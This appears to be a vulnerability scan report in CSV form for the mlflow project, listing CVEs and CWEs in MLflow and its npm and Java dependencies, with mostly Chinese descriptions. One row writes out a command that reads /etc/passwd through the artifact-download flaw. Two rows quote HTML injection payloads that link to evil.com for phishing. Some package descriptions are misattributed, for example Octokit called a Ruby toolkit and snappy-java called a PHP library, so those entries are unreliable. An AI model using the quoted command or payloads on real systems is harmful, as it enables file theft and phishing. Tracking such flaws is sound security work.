mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-37061,CWE-94,2024-06-04,MLflow 是一个开源的平台，用于管理机器学习生命周期，包括实验、可重复运行和模型部署。当版本为1.11.0及更高版本的MLflow被使用时，存在远程代码执行漏洞。攻击者可以通过上传特制的MLproject文件，在系统上执行任意代码。该文件会诱导系统加载恶意代码，从而允许执行。,2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-37055,CWE-502,2024-06-04,在运行版本1.24.0或更新版本的MLflow平台中，存在反序列化不受信任数据的漏洞。该漏洞允许恶意上传的pmdarima模型在与用户交互时在用户系统上运行任意代码。,2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-37057,CWE-502,2024-06-04,在运行版本2.0.0rc0或更新版本的MLflow平台中，存在反序列化不受信任数据的漏洞。该漏洞允许恶意上传的Tensorflow模型在与用户系统交互时运行任意代码。,2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-37058,CWE-502,2024-06-04,MLflow 平台 2.5.0 及以上版本存在反序列化未受信任数据的漏洞。攻击者可以通过上传恶意的 Langchain AgentExecutor 模型，在用户与之交互时执行任意代码。,2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-6838,CWE-400,,MLflow是一个开源的机器学习开发平台，旨在简化机器学习项目的管理，提供实验跟踪、模型部署等功能。在MLflow版本v2.13.2中，由于实验名称缺少限制，存在安全漏洞，允许创建或重命名实验时使用大量整数，这可能导致MLflow用户界面失去响应，从而导致拒绝服务。此外，在创建实验时，`artifact_location`参数也没有字符限制。,3,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2025-0453,CWE-410,,MLFlow 是一个开源的机器学习平台，旨在简化机器学习工作流的管理。在 MLFlow 版本 2.17.2 中，`/graphql` 端点存在拒绝服务攻击（DoS）的漏洞。攻击者可以创建大量复杂的查询批次，反复请求特定实验下的所有运行记录，导致 MLFlow 分配的所有工作者被大量请求占用，无法响应其他请求。这一漏洞源于对资源消耗的未受控管理。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2025-52967,CWE-918,2025-06-23,MLflow是一款用于管理机器学习生命周期的开源平台，涵盖了实验跟踪、项目部署和模型管理等功能。该漏洞涉及MLflow中的gateway_proxy_handler组件，该组件负责处理网关路径请求，然而在版本3.1.0之前，其路径验证功能存在缺失。这种缺陷使得某些未经验证的输入可以通过此组件传递，可能导致非法请求被接收和处理。,3,2
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-27134,CWE-276 CWE-367,2024-11-25,MLflow 是一个开源的平台，旨在简化机器学习开发，它包括了管理和跟踪实验、将代码打包成可重复的运行以及共享和部署模型的能力。在 MLflow 中，由于目录权限设置过多，使用 spark_udf 功能时存在本地特权升级的漏洞。这意味着攻击者可以通过利用这一漏洞获得更高的系统权限，从而执行未授权的操作。,2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2025-1473,CWE-352,,mlflow 是一个开源的机器学习平台，旨在管理机器学习生命周期的各个方面，包括实验跟踪、项目包装和模型部署。在版本 2.17.0 到 2.20.1 的注册功能中，存在跨站请求伪造（CSRF）漏洞。攻击者可以利用这一漏洞创建新账户，从而可在恶意用户的名义下执行未经授权的操作。这一漏洞的根本原因是对 CSRF 攻击缺乏足够的防护和验证，特别是在处理用户注册请求时。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-8859,CWE-29,,MLflow是一个开源的平台，旨在简化机器学习开发，包括跟踪实验、打包代码和共享模型。在MLflow的2.15.1版本中，发现了一个路径遍历漏洞，该漏洞源于dbfs服务的不当配置。具体而言，漏洞发生在`_validate_non_local_source_contains_relative_paths()`函数中，当`dbfs`服务被配置并挂载到本地目录而不是Databricks时，攻击者可以通过操纵`file:`协议中的URL读取任意文件，因为该实现未能适当清理路径之外的输入，如查询和参数。,2,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2025-1474,CWE-521,,在 MLflow 版本 2.18 中，管理员可以在未设置密码的情况下创建新用户账户。MLflow 是一个开源的机器学习平台，旨在简化机器学习的开发和管理。由于缺乏对设置密码的要求，该漏洞可能导致未授权访问，从而引发安全风险。此外，这一做法违反用户账户安全管理的最佳实践。该漏洞已在版本 2.19.0 中修复。,3,1
mlflow_mlflow,mlflow,2.8.1,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供实验跟踪、模型管理等功能。在测试过程中发现，当用户访问日志中的 PDF 工件时，存在定制 JavaScript 执行的漏洞。该漏洞是由项目的默认安装中使用的易受攻击的 PDFjs 封装导致的。攻击者可以通过上传特制的 PDF 文件来引发 JavaScript 的执行，从而影响其他用户。</p>,3,1
mlflow_mlflow,mlflow,2.8.1,True,,,,<p>mlflow是一个开源的机器学习平台，允许数据科学家和开发者使用不同的工具进行机器学习模型的构建和管理。在AWS上，发现一个未被声明的S3存储桶，攻击者可以声称这个存储桶并获得对它的控制权。这种漏洞的根本原因是对S3存储桶的管理不当，导致存储桶处于可被恶意接管的状态。攻击者可通过直接访问未声明的S3存储桶地址，执行接管操作。</p>,2,1
mlflow_mlflow,mlflow,2.8.1,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的整个生命周期，包括实验、重现和部署。该漏洞存在于 Github Actions 的工作流中，攻击者可以提交包含可执行代码的恶意 Pull Request，这些代码在没有适当授权的情况下执行，从而导致敏感令牌泄露并危及代码库的安全。</p>,1,1
mlflow_mlflow,mlflow,2.8.1,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的开发、实验和部署。当一个页面未能设置适当的 X-Frame-Options 或 Content-Security-Policy HTTP 头时，攻击者可以在其控制的页面中通过 iframe 加载受影响的页面。这种漏洞的根本原因在于缺乏必要的防护措施。攻击者可通过在用户的浏览器中叠加一个虚假的用户界面，诱使受害者进行诸如鼠标点击和键盘输入等操作，进而在被攻击的应用中无意执行指令。</p>,4,1
mlflow_mlflow,mlflow,2.8.1,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理工具，允许用户追踪实验、项目和最终模型。在使用 mlflow cli 命令下载工件时，存在本地文件包含漏洞，攻击者可以通过提供不安全的 URI 来下载服务器上任何位置的文件。攻击者可以利用这一漏洞，执行类似 'mlflow artifacts download -u /etc/passwd -d /home/ubuntu/test/' 的命令，将 /etc/passwd 的内容下载到本地目录，从而暴露敏感信息。</p>,2,1
mlflow_mlflow,mlflow,2.8.1,True,,,,"<p>mlflow是一个开源的机器学习平台，旨在简化并优化机器学习模型的管理和部署。当使用`dangerouslySetInnerHTML`方法渲染用户输入的内容时，如果未采取适当的输入验证，就会导致HTML注入漏洞。攻击者可以通过存储恶意HTML代码创建假网页，例如使用标记<a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">click here to get gift</a>来实施钓鱼攻击，将受害者重定向到另一个网站。</p>",3,1
mlflow_mlflow,mlflow,2.8.1,True,,,,<p>mlflow是一个用于机器学习生命周期管理的开源平台，支持多种机器学习模型的实验跟踪、项目管理和模型部署。该漏洞源于使用pickle.load函数不当，攻击者可以借此加载恶意构造的pickle文件。当用户从互联网下载一个模型并使用该框架检查模型训练结果时，可能会触发代码执行。具体的执行流程是，当检查'train'步骤时，会调用inspect函数，继而调用BaseCard.load方法加载卡片模型，这一过程可能导致任意代码执行。</p>,3,1
mlflow_mlflow,mlflow,2.8.1,True,,,,<p>MLflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发者管理整个机器学习生命周期。该漏洞存在于用户输入未被恰当验证和清理的情况下，导致攻击者能够通过 XSS 注入虚假的登录表单或欺骗性用户界面到合法网页中。攻击者可以在这些虚假表单中窃取敏感信息，例如用户名、密码或信用卡详细信息。具体地，在使用 `render_template_string` 函数时，如不对用户输入进行适当转义，用户控制的值即可能成为 JavaScript 代码的来源，最终导致跨站脚本攻击的发生。</p>,3,1
mlflow_mlflow,mlflow,2.8.1,True,,,,<p>MLflow 是一个开源平台，用于管理机器学习生命周期，包括实验跟踪、项目打包和模型管理。在创建实验时，当使用 POST 请求向 /ajax-api/2.0/mlflow/experiments/create 发送包含相同名称的实验的请求时，系统原本应该检查该实验名称是否已经存在，并返回错误信息。然而，由于存在竞争条件，多个同时请求可以成功创建相同名称的实验。这种漏洞的根源在于对并发请求的处理不当，导致了一致性问题和安全隐患。</p>,3,1
mlflow_mlflow,mlflow,2.8.1,True,,,,<p>mlflow 是一个用于管理机器学习生命周期的开源平台，它提供模型训练、记录和模型部署的功能。当用户上传数据集时，由于使用 MD5 哈希值作为数据集标识符，可能导致哈希冲突，从而阻止新的数据集上传。攻击者可以利用此漏洞，通过提前创建具有相同名称和内容的已知数据集，从而占用相应的MD5哈希值，导致其他用户无法上传同名数据集。</p>,3,1
mlflow_mlflow,mlflow,2.8.1,True,,,,"<p>MLflow 是一个用于管理机器学习生命周期的开源平台，支持实验记录、模型部署和系列管理。该平台存在HTML/XSS注入漏洞，攻击者可以通过在网页表单或输入字段中注入恶意代码，从而使用户在浏览网页时被重定向到恶意网站。攻击者可以利用该漏洞通过修改描述字段来注入HTML代码，例如用 <a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">submit your report here </a>，从而实现用户重定向。在用户保存后，该链接将出现在用户界面上，点击后会将用户重定向到恶意网站。</p>",2,1
mlflow_mlflow,mlflow,2.8.1,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供了模型登记、追踪实验和模型部署等功能。该漏洞存在于 mlflow 的文件操作中，攻击者可以通过重写 YAML 文件中的敏感字段，导致远程代码执行或本地文件读取。具体来说，当调用 `write_yaml()` 函数并设置 `overwrite=True` 时，系统未能正确验证文件内容的有效性，攻击者能够覆盖关键属性如 `source` 和 `storage_location`，并在多种情况下利用此漏洞。</p>,1,1
mlflow_mlflow,mlflow,2.8.1,True,CVE-2024-37059,CWE-502,2024-06-04,在运行版本0.5.0或更新版本的MLflow平台中，反序列化不可信数据时会出现漏洞，允许恶意上传的PyTorch模型在用户系统上执行任意代码。,2,0
mlflow_mlflow,mlflow,2.8.1,True,CVE-2025-11201,CWE-22,2025-10-29,MLflow Tracking Server 是一个用于管理机器学习模型生命周期的开源平台，包括实验记录、模型注册和模型部署等功能。在该漏洞中，受影响组件在处理模型文件路径时，缺乏对用户输入路径的正确验证，导致攻击者能够构造恶意路径并触发文件操作。这种漏洞通常是由于未正确验证输入数据或未限制目录访问范围所引起的。攻击者可以利用构造的路径执行任意代码，具体地是在服务账户的权限上下文中执行代码。,1,2
mlflow_mlflow,sanitize-html,^1.18.5,True,CVE-2024-21501,CWE-200 CWE-538,2024-02-24,"Apostrophe sanitize-html是美国Apostrophe公司的一个库。清理用户提交的 HTML，在每个元素的基础上保留列入白名单的元素和列入白名单的属性。
Apostrophe sanitize-html 2.12.1之前版本存在安全漏洞。攻击者利用该漏洞收集有关目标服务器的文件系统结构和依赖项的详细信息。",3,2
mlflow_mlflow,sanitize-html,^1.18.5,True,CVE-2019-25225,CWE-79,2025-09-08,sanitize-html 是一个用于清理 HTML 内容的库，通常用于防止用户提交恶意代码。它的核心功能是通过 sanitizeHtml() 方法过滤和处理 HTML 内容，以确保输出的安全性。然而，在版本 2.0.0-beta 之前，该库的 sanitizeHtml() 方法在使用自定义 transformTags 选项时未正确处理内容。transformTags 选项旨在将 HTML 元素的属性值转换为文本，但由于缺少有效的输入验证，攻击者可以利用该功能将恶意输入转换为可执行代码，从而触发 XSS 攻击。该漏洞的根本原因是组件缺乏对用户输入的严格校验，尤其是在 transformTags 自定义逻辑中。,3,0
mlflow_mlflow,http-proxy-middleware,^1.0.3,True,CVE-2025-32996,CWE-670,2025-04-15,http-proxy-middleware 是一个用于 Node.js 的中间件库，主要用于创建代理服务器。该漏洞出现在 2.0.8 之前的版本和 3.x 版本的 3.0.4 之前的版本中，原因是代码中的 'writeBody' 函数可以被调用两次，因为没有使用 'else if' 语句，从而导致逻辑混淆。此漏洞可能允许多个同一请求的体内容被错误地处理。,3,0
mlflow_mlflow,http-proxy-middleware,^1.0.3,True,CVE-2025-32997,CWE-754,2025-04-15,http-proxy-middleware 是一个用于 Node.js 的中间件，用于创建代理服务器。在版本 2.0.9 之前和 3.x 的 3.0.5 之前，当 bodyParser 处理失败时，fixRequestBody 仍然会继续执行。该漏洞源于错误的控制逻辑，未能正确处理 bodyParser 的失败，导致潜在的安全问题。攻击者可以利用这一漏洞，发送特制的请求，可能导致敏感信息泄露或服务逻辑被错误处理。,3,0
mlflow_mlflow,http-proxy-middleware,^1.0.3,True,CVE-2024-21536,CWE-400,2024-10-19,http-proxy-middleware 是用于 connect、express、next.js 等的 Node.js http 代理中间件。此组件在 http-proxy-middleware 2.0.7之前版本和3.0.0版本至3.0.3之前版本存在安全漏洞。导致此漏洞的根本原因是未能正确处理某些输入，可能会被恶意攻击者利用，从而导致系统崩溃。,2,2
mlflow_mlflow,cookie,0.3.1,True,CVE-2024-47764,CWE-74,2024-10-04,"cookie是jshttp开源的一个 HTTP 服务器 cookie 解析和序列化库。
cookie 0.7.0之前版本存在安全漏洞，该漏洞源于允许攻击者通过操纵cookie名称来设置cookie的其他字段，导致意外的cookie值。",3,2
mlflow_mlflow,showdown,^1.8.6,True,,CWE-1022,2020-09-04,"Versions of `showdown` prior to 1.9.1 are vulnerable to [Reverse Tabnabbing](https://www.owasp.org/index.php/Reverse_Tabnabbing). The package uses `target='_blank'` in anchor tags, allowing attackers to access `window.opener` for the original page when opening links. This is commonly used for phishing attacks.


## Recommendation

Upgrade to version 1.9.1 or later.",4,0
mlflow_mlflow,webpack-dev-server,4.15.2,False,CVE-2025-30359,CWE-749,2025-06-03,"webpack-dev-server是webpack开源的一个提供webpack的应用程序。
webpack-dev-server 5.2.1之前版本存在安全漏洞，该漏洞源于用户访问恶意网站时可能被窃取源代码。",3,0
mlflow_mlflow,mermaid,11.9.0,False,CVE-2025-54881,CWE-79,2025-08-19,"Mermaid是mermaid-js开源的一个应用软件。使用文本和代码创建图表和可视化。
Mermaid 10.9.0-rc.1版本至11.9.0版本存在跨站脚本漏洞，该漏洞源于用户输入的序列图标签传递给innerHTML，可能导致跨站脚本。",3,0
mlflow_mlflow,validator,13.15.15,False,CVE-2025-56200,CWE-79,2025-09-30,"Validator.js是一个字符串验证器
validator.js 13.15.15及之前版本存在安全漏洞，该漏洞源于URL验证绕过，可能导致跨站脚本和开放重定向攻击。",3,0
mlflow_mlflow,@octokit/request,8.4.1,False,CVE-2025-25290,CWE-1333,2025-02-14,"Octokit是GitHub API 的 Ruby 工具包。
Octokit 1.0.0版本至9.2.1之前版本存在安全漏洞，该漏洞源于正则表达式匹配行为的无限制性质，可能导致在处理特制输入时发生灾难性的回溯，容易受到正则表达式拒绝服务(ReDoS)攻击。",3,2
mlflow_mlflow,undici,5.29.0,False,CVE-2024-24750,CWE-400 CWE-401,2024-02-16,"undici是一个HTTP/1.1客户端。
undici 6.0.0至6.6.0版本存在资源管理错误漏洞，该漏洞源于函数fetch（）存在内存泄漏漏洞。",3,0
mlflow_mlflow,@octokit/plugin-paginate-rest,9.2.2,False,CVE-2025-25288,CWE-1333,2025-02-14,"Octokit是GitHub API 的 Ruby 工具包。
Octokit 1.0.0版本至11.4.1之前版本存在安全漏洞，该漏洞源于特制的octokit实例可能会触发正则表达式拒绝服务(ReDoS)攻击。",3,2
mlflow_mlflow,commons-codec,1.10,False,,CWE-200,2012-03-04,"## Overview
[commons-codec:commons-codec](https://commons.apache.org/proper/commons-codec) is a package that contains simple encoder and decoders for various formats such as Base64 and Hexadecimal.

Affected versions of this package are vulnerable to Information Exposure. When there is no byte array value that can be encoded into a string the Base32 implementation does not reject it, and instead decodes it into an arbitrary value which can be re-encoded again using the same implementation. This allows for information exposure exploits such as tunneling additional information via seemingly valid base 32 strings.
## Remediation
Upgrade `commons-codec:commons-codec` to version 1.13 or higher.
## References
- [GitHub Commit](https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113)
- [Jira Issue](https://issues.apache.org/jira/browse/CODEC-134)
",4,0
mlflow_mlflow,guava,30.1.1-android,False,CVE-2023-2976,CWE-552,2023-06-14,Google Guava库中的FileBackedOutputStream在Unix系统和Android Ice Cream Sandwich中使用Java的默认临时目录来创建文件，这允许机器上具有访问默认Java临时目录权限的其他用户和应用程序访问该类创建的文件。,3,0
mlflow_mlflow,guava,30.1.1-android,False,CVE-2020-8908,CWE-378 CWE-732,2020-10-23,Guava所有版本中存在一个临时目录创建漏洞，该漏洞允许具有机器访问权限的攻击者可能访问由Guava API com.google.common.io.Files.createTempDir()创建的临时目录中的数据。在默认情况下，在类Unix系统中，创建的目录是全局可读的（攻击者只要有系统访问权限就可以读取）。该问题方法在30.0版本及以后已被标记为@Deprecated，并且不应当被使用。,4,0
mlflow_mlflow,gson,2.8.6,False,CVE-2022-25647,CWE-502,2022-05-01,该漏洞影响 Gson 库，版本号低于2.8.9。攻击者通过构造特制的 JSON 数据包，在网络中发送给使用受影响版本 Gson 库的服务器，可能导致拒绝服务攻击。,2,0
mlflow_mlflow,commons-io,2.5,True,CVE-2024-47554,CWE-400,2024-10-03,"Apache Commons IO是美国阿帕奇（Apache）基金会的一个应用程序。提供一个帮助开发IO功能。
Apache Commons IO 2.0版本至2.14.0之前版本存在资源管理错误漏洞，该漏洞源于CPU资源消耗不受控制。",3,0
mlflow_mlflow,testng,6.14.3,True,CVE-2022-4065,CWE-22,2022-11-19,TestNG是一种流行的Java测试框架，用于并发测试和多线程测试应用程序。TestNG 6.13到7.5.0版本以及7.6.0到7.7.0版本存在一个路径遍历漏洞，该漏洞位于JarFileUtils.java文件中的testngXmlExistsInJar函数。当处理.xml、.yaml或.yml文件时，函数未能正确验证文件路径，从而允许攻击者利用该漏洞访问限制目录范围之外的文件。,3,0
mlflow_mlflow,aircompressor,0.25,False,CVE-2024-36114,CWE-125 CWE-787,2024-05-29,"Aircompressor是airlift开源的一个将 Snappy、LZO、LZ4 和 Zstandard 压缩算法移植到 Java 的库。
Aircompressor 0.27之前版本存在安全漏洞，该漏洞源于解压器可能会使JVM崩溃并泄漏内存内容。",2,2
mlflow_mlflow,guava,16.0.1,False,CVE-2023-2976,CWE-552,2023-06-14,Google Guava库中的FileBackedOutputStream在Unix系统和Android Ice Cream Sandwich中使用Java的默认临时目录来创建文件，这允许机器上具有访问默认Java临时目录权限的其他用户和应用程序访问该类创建的文件。,3,0
mlflow_mlflow,guava,16.0.1,False,CVE-2020-8908,CWE-378 CWE-732,2020-10-23,Guava所有版本中存在一个临时目录创建漏洞，该漏洞允许具有机器访问权限的攻击者可能访问由Guava API com.google.common.io.Files.createTempDir()创建的临时目录中的数据。在默认情况下，在类Unix系统中，创建的目录是全局可读的（攻击者只要有系统访问权限就可以读取）。该问题方法在30.0版本及以后已被标记为@Deprecated，并且不应当被使用。,4,0
mlflow_mlflow,zookeeper,3.6.3,False,CVE-2024-23944,CWE-862,2024-03-15,CVE-2024-23944 是 Apache ZooKeeper 中的一个漏洞，因缺少对持久监视器（persistent watchers）的访问控制列表（ACL）检查而导致不正确的处理。已获得父 znode 访问权的攻击者可以使用 addWatch 命令附加持久监视器。当此监视器被触发时，ZooKeeper 服务器不会执行必要的 ACL 检查，导致子 znode 的完整路径向攻击者暴露。虽然 znode 内的数据未被直接暴露，但路径信息可能包含敏感信息，例如用户名或登录 ID，从而使该漏洞具有潜在的严重性。,3,0
mlflow_mlflow,zookeeper,3.6.3,False,CVE-2023-44981,CWE-639,2023-10-11,"Apache Zookeeper是美国阿帕奇（Apache）基金会的一个软件项目，它能够为大型分布式计算提供开源的分布式配置服务、同步服务和命名注册等功能。
Apache ZooKeeper 3.9.1之前、3.8.3之前、3.7.2之前版本存在安全漏洞，该漏洞源于如果在 ZooKeeper 中启用了 SASL Quorum Peer 身份验证 (quorum.auth.enableSasl=true)，则通过验证 SASL 身份验证 ID 中的实例部分会在 Zoo 中列出来，SASL 身份验证 ID 中的实例部分是可选的。",1,2
mlflow_mlflow,commons-compress,1.23.0,False,CVE-2023-42503,CWE-20 CWE-400,2023-09-14,CVE-2023-42503 是 Apache Commons Compress 中的一个漏洞，该漏洞源于 TAR 文件解析时的不当输入验证和不受控制的资源消耗问题。攻击者可以通过创建一个修改了文件修改时间头部的恶意 TAR 文件来利用该漏洞。当使用 Apache Commons Compress 解析该 TAR 文件时，会因 CPU 资源消耗而导致拒绝服务。,3,0
mlflow_mlflow,commons-compress,1.23.0,False,CVE-2024-26308,CWE-770,2024-02-19,在Apache Commons Compress库中，版本1.21至1.25存在资源分配无限制或限制不足漏洞（CVE-2024-26308）。此漏洞是由于未正确分配资源所致，可能导致内存和CPU资源被过度消耗。如果攻击者提供特制的输入数据，可能导致系统过载并发生拒绝服务（DoS）攻击。,3,0
mlflow_mlflow,commons-compress,1.23.0,False,CVE-2024-25710,CWE-835,2024-02-19,在 Apache Commons Compress 版本1.3到1.25.0中存在一个无限循环漏洞。当处理一个损坏的DUMP文件时，程序会进入一个不可退出的循环，导致应用程序挂起或崩溃。,2,0
mlflow_mlflow,commons-lang3,3.12.0,False,CVE-2025-48924,CWE-674,2025-07-11,Apache Commons Lang 是一个用于提供对 Java 基础类操作的通用工具库。该库中的 ClassUtils.getClass(...) 方法在处理非常长的输入时会因递归调用过深导致 StackOverflowError。递归深度没有得到有效控制，可能导致系统堆栈溢出，这是由于输入深度未被正确限制。目前影响版本包括从 commons-lang:commons-lang 2.0 到 2.6，以及 org.apache.commons:commons-lang3 3.0 到 3.18.0 之前的版本。此错误通常不被应用程序和库捕获处理，从而可能导致应用程序停止服务。,2,2
mlflow_mlflow,commons-io,2.5,False,CVE-2024-47554,CWE-400,2024-10-03,"Apache Commons IO是美国阿帕奇（Apache）基金会的一个应用程序。提供一个帮助开发IO功能。
Apache Commons IO 2.0版本至2.14.0之前版本存在资源管理错误漏洞，该漏洞源于CPU资源消耗不受控制。",3,0
mlflow_mlflow,snappy-java,1.1.10.3,False,CVE-2023-43642,CWE-770,2023-09-25,"Snappy是KNP Labs个人开发者的一个 PHP 库，允许从 url 或 html 页面生成缩略图、快照或 PDF。
Snappy 1.1.10.3及之前版本存在安全漏洞，该漏洞源于SnappyInputStream缺少对块长度的上限检查，导致解压过大的数据时容易受到拒绝服务（DoS）攻击。",2,2
mlflow_mlflow,netty-codec-http,4.1.96.Final,False,CVE-2024-29025,CWE-770,2024-03-25,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.108.Final之前版本存在安全漏洞，该漏洞源于“HttpPostRequestDecoder”被用来积累数据。",3,2
mlflow_mlflow,netty-codec-http,4.1.96.Final,False,CVE-2025-58056,CWE-444,2025-09-03,Netty 是一个异步事件驱动的网络应用程序框架，主要用于开发可维护的高性能协议服务器和客户端。在版本 4.1.124.Final 和 4.2.0.Alpha3 至 4.2.4.Final 中，Netty 在解析 HTTP/1.1 消息的分块编码时存在缺陷：它错误地接受了单独的换行符 (LF) 作为块大小行的终止符，而不是严格要求的 CRLF（回车和换行符组合），这违反了 HTTP/1.1 标准。当 Netty 部署在某些解析 LF 不同的反向代理后端时，攻击者可以构造特定请求，使代理认为这是一个请求，但 Netty 会将其解析为两个请求，从而实现请求走私攻击。该缺陷已在版本 4.1.125.Final 和 4.2.5.Final 中修复。,4,2
mlflow_mlflow,netty-codec-http2,4.1.96.Final,False,,CWE-400,2023-10-11,"A client might overload the server by issue frequent RST frames. This can cause a massive amount of load on the remote system and so cause a DDOS attack. 

### Impact
This is a DDOS attack, any http2 server is affected and so you should update as soon as possible.

### Patches
This is patched in version 4.1.100.Final.

### Workarounds
A user can limit the amount of RST frames that are accepted per connection over a timeframe manually using either an own `Http2FrameListener` implementation or an `ChannelInboundHandler` implementation (depending which http2 API is used).

### References
- https://www.cve.org/CVERecord?id=CVE-2023-44487
- https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/
- https://cloud.google.com/blog/products/identity-security/google-cloud-mitigated-largest-ddos-attack-peaking-above-398-million-rps/",2,2
mlflow_mlflow,netty-codec-http2,4.1.96.Final,False,CVE-2025-55163,CWE-770,2025-08-13,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.124.Final和4.2.4.Final之前版本存在安全漏洞，该漏洞源于HTTP/2协议逻辑缺陷，可能导致资源耗尽和分布式拒绝服务攻击。",2,2
mlflow_mlflow,netty-common,4.1.96.Final,False,CVE-2024-47535,CWE-400,2024-11-12,Netty 是由 Netty 社区开发的高性能、异步事件驱动的 Java 网络应用框架，常用于创建协议服务器和客户端等网络应用。在 Netty 的 4.1.114 及之前的版本中，存在一个资源管理错误漏洞。此漏洞的根本原因在于框架未能安全地读取环境文件，可能导致环境变量中的敏感信息泄露，影响到应用程序的机密性。,3,0
mlflow_mlflow,netty-common,4.1.96.Final,False,CVE-2025-25193,CWE-400,2025-02-10,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.118.Final及之前版本存在资源管理错误漏洞，该漏洞源于Windows环境下对不存在的大文件读取未正确处理，可能引发拒绝服务。",3,0
mlflow_mlflow,netty-handler,4.1.96.Final,False,CVE-2023-4586,CWE-20 CWE-295,2020-01-10,<p>Hot Rod Client是由Netty框架使用的组件，通常用于处理跨节点的通信。此漏洞源于当TLS加密被使用时，Hot Rod Client未正确验证主机名（CWE-295）。这种不当的证书验证可能允许攻击者进行中间人（MITM）攻击，冒充合法服务器与客户端进行通信，从而拦截或篡改数据。受影响的系统包括多个依赖Netty的应用程序，如IBM Event Streams和Process Mining。</p><p>注意：官方以不承认该漏洞，请结合实际业务分析确认是否值得修复。</p>,2,0
mlflow_mlflow,netty-handler,4.1.96.Final,False,CVE-2025-24970,CWE-20,2025-02-10,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.91.Final版本至4.1.118.Final之前版本存在输入验证错误漏洞，该漏洞源于SslHandler对特定恶意数据包的验证缺陷，导致原生崩溃。",2,2
mlflow_mlflow,ivy,2.5.1,False,CVE-2022-46751,CWE-91 CWE-611,2023-08-21,<p>Apache Ivy 是一个用于简化基于Java的项目依赖管理的工具。它在处理XML文件时，例如其自身的配置文件、Ivy文件或Maven POM文件，存在不当限制外部实体引用的漏洞。这个漏洞会允许下载和扩展任何包含在XML中的外部文档类型定义（DTDs），从而可能导致敏感信息泄露和未经授权的资源访问。</p>,2,0
mlflow_mlflow,janino,3.1.9,False,CVE-2023-33546,CWE-787,2023-06-01,Janino 是一个轻量级的 Java 编译器库，通常用于动态表达式评估和 Java 源代码编译。该库的 3.1.9 及更早版本在其 `evaluator.guessParameterName()` 方法中存在输入验证不足的问题。攻击者可以通过构造恶意输入，导致栈溢出（stack overflow），从而使解析器崩溃，导致拒绝服务（DoS）。特别是，当系统处理不可信输入时，该漏洞的风险会显著增加。,3,0
mlflow_mlflow,junit,4.12,True,CVE-2020-15250,CWE-200 CWE-732,2020-10-12,JUnit4的测试规则TemporaryFolder中存在一个本地信息泄露漏洞。在Unix类系统中，系统的临时目录在所有用户之间是共享的。因此，当文件和目录被写入此目录时，默认情况下，该系统上的其他用户可以读取它们。此漏洞不允许其他用户覆盖这些目录或文件的内容。这只是一个纯粹的信息泄露漏洞。如果你在JUnit测试中写入敏感信息，如API密钥或密码，到临时文件夹中，并且JUnit测试在一个有其他不受信任用户的操作系统环境中执行，那么此漏洞将影响你。,3,0
mlflow_mlflow,aircompressor,0.25,False,CVE-2024-36114,CWE-125 CWE-787,2024-05-29,"Aircompressor是airlift开源的一个将 Snappy、LZO、LZ4 和 Zstandard 压缩算法移植到 Java 的库。
Aircompressor 0.27之前版本存在安全漏洞，该漏洞源于解压器可能会使JVM崩溃并泄漏内存内容。",2,2
mlflow_mlflow,spark-network-common_2.13,3.5.0,False,CVE-2025-55039,CWE-326 CWE-347,2025-10-15,Apache Spark 是一个广泛使用的大数据处理框架，用于处理大规模数据集并提供分布式计算能力。该漏洞涉及 Spark 的远程过程调用（RPC）加密默认配置为未认证的 AES-CTR 模式。AES-CTR 是一种对称加密算法，尽管其可以提供加密功能，但未认证的实现会导致数据完整性无法得到保证。攻击者可以利用这种缺陷，通过中间人攻击修改加密数据的密文，从而影响通信的安全性。,1,2
mlflow_mlflow,guava,16.0.1,False,CVE-2023-2976,CWE-552,2023-06-14,Google Guava库中的FileBackedOutputStream在Unix系统和Android Ice Cream Sandwich中使用Java的默认临时目录来创建文件，这允许机器上具有访问默认Java临时目录权限的其他用户和应用程序访问该类创建的文件。,3,0
mlflow_mlflow,guava,16.0.1,False,CVE-2020-8908,CWE-378 CWE-732,2020-10-23,Guava所有版本中存在一个临时目录创建漏洞，该漏洞允许具有机器访问权限的攻击者可能访问由Guava API com.google.common.io.Files.createTempDir()创建的临时目录中的数据。在默认情况下，在类Unix系统中，创建的目录是全局可读的（攻击者只要有系统访问权限就可以读取）。该问题方法在30.0版本及以后已被标记为@Deprecated，并且不应当被使用。,4,0
mlflow_mlflow,zookeeper,3.6.3,False,CVE-2024-23944,CWE-862,2024-03-15,CVE-2024-23944 是 Apache ZooKeeper 中的一个漏洞，因缺少对持久监视器（persistent watchers）的访问控制列表（ACL）检查而导致不正确的处理。已获得父 znode 访问权的攻击者可以使用 addWatch 命令附加持久监视器。当此监视器被触发时，ZooKeeper 服务器不会执行必要的 ACL 检查，导致子 znode 的完整路径向攻击者暴露。虽然 znode 内的数据未被直接暴露，但路径信息可能包含敏感信息，例如用户名或登录 ID，从而使该漏洞具有潜在的严重性。,3,0
